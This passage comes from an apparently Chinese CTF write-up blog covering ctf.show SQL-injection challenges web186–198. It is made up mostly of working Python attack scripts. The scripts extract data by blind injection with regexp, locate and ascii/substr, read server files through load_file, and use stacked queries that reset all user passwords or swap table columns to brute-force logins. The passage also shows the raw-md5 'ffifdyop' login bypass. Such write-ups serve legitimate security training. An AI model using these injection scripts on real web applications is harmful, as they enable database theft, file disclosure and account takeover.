class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0ee67cf6-8b94-4384-962b-101fce5a7862.chall.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;createNum(i)&#125;</span>,<span class="subst">&#123;createNum(<span class="number">1</span>)&#125;</span>)regexp(char(<span class="subst">&#123;createNum(j)&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p><code>md5($_POST[&#39;password&#39;],true);</code>老面孔了用户名填写<code>admin</code>密码为<code>ffifdyop</code><br>具体的原理的话以前写过一篇类似的文章<a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=160631731619195283021913&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&amp;utm_term=md5%20%20_POST%20%20password%20%20,true&amp;spm=1018.2118.3001.4450">[SQL绕过]md5($str,true)类型绕过——题目来源CTFSHOW—web9</a></p><p>然后抓个包<br><img src="https://img-blog.csdnimg.cn/20201125231649770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>首先<br><code>SELECT * FROM kk where username = 1&lt;1 and password = 0</code><br>太高雅了为什么这样就可以查到所有数据<br>这是弱比较：字符串会转为0 ，所以0=0永远成立<br>可以<a href="https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v">参考这篇文章，点我</a><br>所以<code>SELECT * FROM kk where username = 0 and password = 0</code>也可以</p><p>拓展:牛逼<br><code>SELECT * FROM kk where username = &#39;aaa&#39; and password = 12</code><br>查出<code>username=aaa password=12sasad</code><br>或者<br><img src="https://img-blog.csdnimg.cn/20201125233414127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>稍微解释下首先找到<code>flag&#123;</code>位置然后再盲注得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3d54cb5b-69e8-4592-85b3-662e3aa01ea5.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlagIndex</span>():</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">300</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;flag&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;0&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(mid)),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">num</span>):</span><br><span class="line">    i = <span class="built_in">int</span>(num)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),</span><br><span class="line">                                                                                                               <span class="built_in">str</span>(</span><br><span class="line">                                                                                                                   mid)),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    index = getFlagIndex()</span><br><span class="line">    getFlag(index)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://02e6409f-d1ac-41e0-8355-c7e0cb8ca1d8.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span>  == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7d316f9f-0da8-442d-bf6d-c976a20260e8.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(ord(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span>  == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">z = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if((select group_concat(f1ag) from ctfshow_fl0g)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>这道题写了两个脚本，写着玩的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE</span></span><br><span class="line">url = <span class="string">&quot;http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;</span></span><br><span class="line">final = <span class="string">&quot;&quot;</span></span><br><span class="line">stttr = <span class="string">&quot;flag&#123;&#125;-_1234567890qwertyuiopsdhjkzxcvbnm&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> stttr:</span><br><span class="line">        final += j</span><br><span class="line">        <span class="comment"># 查表名-ctfshow_flxg</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(locate(&#x27;&#123;final&#125;&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment"># 查字段-f1ag</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(locate(&#x27;&#123;final&#125;&#x27;,(select column_name from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27; limit 1,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(locate(&#x27;<span class="subst">&#123;final&#125;</span>&#x27;,(select f1ag from ctfshow_flxg limit 0,1))=1,1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(final)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            final = final[:-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">z = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if((select group_concat(f1ag) from ctfshow_fl0g)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>我比较暴力直接把所有的密码都改为111，之后登录就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;0x61646d696e;update`ctfshow_user`set`pass`=0x313131;&quot;</span></span><br><span class="line"><span class="comment"># 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围</span></span><br><span class="line">sql = <span class="string">&quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>如图，我恨啊<br><img src="https://img-blog.csdnimg.cn/20201127200405772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="web197-198"><a href="#web197-198" class="headerlink" title="web197-198"></a>web197-198</h2><p>通过把密码列与id互换之后爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;varchar(255);&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;0x61646d696e&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">f&#x27;<span 